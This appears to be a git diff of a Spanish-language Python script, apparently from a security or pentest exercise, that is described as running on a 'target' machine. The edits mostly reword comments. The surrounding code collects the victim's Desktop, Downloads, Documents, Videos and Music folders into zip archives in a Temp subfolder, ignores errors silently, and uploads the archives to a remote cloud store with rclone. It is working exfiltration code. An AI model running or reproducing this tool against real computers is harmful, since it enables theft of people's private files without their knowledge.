@@ -26,7 +26,7 @@ print("Este programa se ejecuta en el equipo target y hace lo siguiente:" \
 
 
 
-# 1.Importar librerias necesarias
+# 1.Importo las librerias de Python necesarias
 
 import os
 import zipfile
@@ -36,7 +36,7 @@ import subprocess
 
 
 
-# 2.Crear la subcarpeta "datos_directorios" dentro de Temp
+# 2.Creo la subcarpeta "datos_directorios" dentro de Temp
 ruta_temp = os.path.join(os.path.expandvars(r"%temp%"), "datos_directorios")
 if not os.path.isdir(ruta_temp):
     os.mkdir(ruta_temp)
@@ -52,7 +52,7 @@ print("")
 
 
 
-# 3.Definir los directorios sensibles
+# 3.Defino los directorios sensibles
 Escritorio = os.path.expandvars(r"C:\\Users\\%USERNAME%\\Desktop")
 Descargas = os.path.expandvars(r"C:\\Users\\%USERNAME%\\Downloads")
 Documentos = os.path.expandvars(r"C:\\Users\\%USERNAME%\\Documents")
@@ -64,7 +64,7 @@ Videos = os.path.expandvars(r"C:\\Users\\%USERNAME%\\Videos")
 lista_directorios = [Musica]
 
 
-# 4.Comprobar cada directorio:
+# 4.Compruebo cada directorio:
 for directorio in lista_directorios:
     if not os.path.isdir(directorio):
         print(f"El directorio {directorio} no ha podido ser reconocido.")
@@ -78,7 +78,7 @@ print("")
 
 
 
-# 5. Comprimir cada directorio en archivos .zip independientes dentro de ruta_temp
+# 5. Comprimo cada directorio en archivos .zip independientes dentro de ruta_temp
 print("Comprimiendo directorios...")
 for directorio in lista_directorios:
     nombre = os.path.basename(directorio)
@@ -92,18 +92,17 @@ for directorio in lista_directorios:
                     ruta_relativa = os.path.relpath(ruta_completa, directorio)
                     zipf.write(ruta_completa, arcname=ruta_relativa)
                 except:
-                    pass # Ignora archivos bloqueados individualmente
+                    pass 
 
 print("\n¡Proceso completado con éxito! Las copias están en la carpeta datos_directorios dentro de Temp.")
 
-# Imprimir resultado:
+# Imprimo el resultado en pantalla:
 archivos_zip = os.listdir(ruta_temp)
 print(archivos_zip)
 
 
 
-# 5.Subir datos a la nube con rclone
+# 5.Subo los datos recopilados a la nube con rclone
 # pip install rclone-python   
-# Descargar la herramienta en https://rclone.org/
-
+# Hay que descargar y configurar la herramienta (https://rclone.org/)
 subprocess.run(["rclone", "copy", ruta_temp, "tu_remoto:backup_directorios", "--progress"])
